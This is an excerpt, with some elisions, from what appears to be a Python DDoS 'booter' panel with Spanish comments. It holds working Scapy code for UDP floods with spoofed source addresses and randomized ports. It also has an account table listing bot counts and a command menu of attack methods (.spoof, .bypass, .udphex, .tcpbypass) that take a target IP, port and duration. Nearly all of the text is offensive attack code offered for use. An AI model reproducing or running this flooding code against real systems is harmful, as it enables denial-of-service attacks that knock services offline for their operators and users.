...
accounts = {
    ...
    "asky": {"password": "asky", "bots": 30, "bytes": 1024}
}
...
# Función para realizar el ataque UDP con spoofing
def spoofed_udp_attack(ip, port, duration, packet_size):
    timeout = time.time() + duration
    ...
    def send_packet():
        while time.time() < timeout:
            try:
                ...
                payload = Raw(load=random._urandom(packet_size))
                packet = IP(src=src_ip, dst=ip) / UDP(sport=src_port, dport=port) / payload
...
# Función para realizar el ataque UDP con bypass
def bypass_udp_attack(ip, port, duration, packet_size):
    timeout = time.time() + duration
    ...
    def send_packet():
        while time.time() < timeout:
            try:
                src_port = random.randint(1024, 65535)
                payload = Raw(load=random._urandom(packet_size))
                packet = IP(dst=ip) / UDP(sport=src_port, dport=port) / payload
                send(packet, verbose=False)
            except Exception:
                pass
    ...
    while True:
        try:
            ...
            if cmd == "help":
                ...
                print(".spoof <ip> <port> <time>")
                print(".bypass <ip> <port> <time>")
            elif cmd.startswith("."):
                parts = cmd.split()
                if len(parts) != 4:
                ...
                if method not in [".udphex", ".udpraw", ".tcpbypass", ".udpbypass", ".tcproxies", ".spoof", ".bypass"]:
                ...
                # Ejecutar ataque según el método
                if method == ".spoof":
                    spoofed_udp_attack(ip, port, duration, packet_size)
                elif method == ".bypass":
                    bypass_udp_attack(ip, port, duration, packet_size)
                else:
